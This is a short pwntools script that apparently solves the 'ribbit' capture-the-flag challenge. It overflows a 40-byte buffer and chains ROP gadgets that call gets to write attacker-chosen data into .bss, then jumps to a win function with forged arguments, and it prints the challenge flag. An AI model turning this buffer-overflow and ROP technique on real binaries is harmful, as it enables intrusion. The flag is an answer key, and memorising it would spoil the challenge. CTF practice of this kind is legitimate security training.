
from pwn import  *


#win condition jump_height == 0xf10c70b33f && strncmp("You got this!", motivation, 13) == 0 && strncmp("Just do it!", motivation+21, 11)

'''
statically linked binary , NX, no canary 

use gets on writable address write the expected string and call win 

'''

#p = process("./ribbit")
p = remote("chal.nbctf.com",30170)
win =  0x0000000000401825
pop_rsi_ret = 0x000000000040a04e #: pop rsi; ret; 
pop_rdi_ret = 0x000000000040201f#: pop rdi; ret; 



payload = b'A'*40
payload += p64(pop_rdi_ret)
payload += p64(0x00000000004C72C0) # start .bss
payload += p64(0x000000000040c630) #  address of gets
payload += p64(pop_rdi_ret)
payload += p64(0xf10c70b33f)
payload += p64(pop_rsi_ret)
payload += p64(0x00000000004C72C0)
payload += p64(win)

# gdb.attach(p, gdbscript='''

# b* frog+46
# b* win
# ''')

p.sendline(payload)


expected_string = b'You got this!'
expected_string += b'AAAAAAAA'
expected_string += b'Just do it!'
p.sendline(expected_string)

p.interactive()

# nbctf{ur_w3lc0m3_qu454r_5abf2e}
